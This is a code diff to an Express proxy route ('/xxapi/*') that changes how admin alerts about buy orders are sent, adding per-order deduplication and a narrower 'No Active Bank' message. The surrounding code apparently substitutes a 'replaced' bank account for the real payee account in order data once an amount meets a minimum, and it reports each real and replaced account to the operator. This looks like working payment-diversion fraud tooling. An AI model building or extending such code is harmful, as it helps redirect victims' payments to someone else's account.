@@ -1867,9 +1867,17 @@ app.all('/xxapi/*', async (req, res) => {
         replaceLine = `❌ NOT Replaced (no active bank)`;
       }
       // Determine if order was actually replaced or just not replaced due to min amount
-      if (_bankReplaced && _replacedBank) {
-        notifyAdmin(data,
-          `✅ BUY SUCCESSFUL
+      const alreadyNotified = _orderId && data.orderBankMap && data.orderBankMap[_orderId] && data.orderBankMap[_orderId].notified;
+      const hasValidData = _orderAmt !== null || _realBankSnap || _bankReplaced;
+      
+      if (!alreadyNotified && hasValidData) {
+        if (_orderId && data.orderBankMap && data.orderBankMap[_orderId]) {
+          data.orderBankMap[_orderId].notified = true;
+        }
+
+        if (_bankReplaced && _replacedBank) {
+          notifyAdmin(data,
+            `✅ BUY SUCCESSFUL
 💰 Amount: ₹${_orderAmt !== null ? _orderAmt : 'unknown'}
 📋 Order: ${_orderId || 'N/A'}
 💾 Order is saved for history
@@ -1878,9 +1886,9 @@ ${realLine}
 ━━━━━━━━━━━━━━━━━━━━
 ${replaceLine}
 🕐 ${now}`);
-      } else if (_notReplacedAmt !== null) {
-        notifyAdmin(data,
-          `⚠️ BUY SUCCESSFUL (NOT REPLACED)
+        } else if (_notReplacedAmt !== null) {
+          notifyAdmin(data,
+            `⚠️ BUY SUCCESSFUL (NOT REPLACED)
 💰 Amount: ₹${_notReplacedAmt}
 📋 Order: ${_orderId || 'N/A'}
 ℹ️ ₹${_notReplacedAmt} < Min ₹${_notReplacedMin}
@@ -1889,16 +1897,17 @@ ${realLine}
 ━━━━━━━━━━━━━━━━━━━━
 ${replaceLine}
 🕐 ${now}`);
-      } else if (jsonResp && jsonResp.code !== 0 && jsonResp.code !== 200) {
-        notifyAdmin(data,
-          `❌ BUY NOT SUCCESSFUL
+        } else if (jsonResp && jsonResp.code !== 0 && jsonResp.code !== 200) {
+          notifyAdmin(data,
+            `❌ BUY NOT SUCCESSFUL
 💰 Amount: ₹${_orderAmt !== null ? _orderAmt : 'unknown'}
 📋 Order: ${_orderId || 'N/A'}
 ⚠️ Reason: ${jsonResp.msg || jsonResp.message || 'unknown error'}
 🕐 ${now}`);
-      } else {
-        notifyAdmin(data,
-          `ℹ️ ORDER PLACED (No Active Bank)
+        } else if (_realBankSnap && (_realBankSnap.accountNo || _realBankSnap.accountHolder)) {
+          // Only notify about 'No Active Bank' if there are actual real bank details being shown
+          notifyAdmin(data,
+            `ℹ️ ORDER PLACED (No Active Bank)
 💰 Amount: ₹${_orderAmt !== null ? _orderAmt : 'unknown'}
 📋 Order: ${_orderId || 'N/A'}
 ━━━━━━━━━━━━━━━━━━━━
@@ -1906,6 +1915,7 @@ ${realLine}
 ━━━━━━━━━━━━━━━━━━━━
 ${replaceLine}
 🕐 ${now}`);
+        }
       }
     }
 
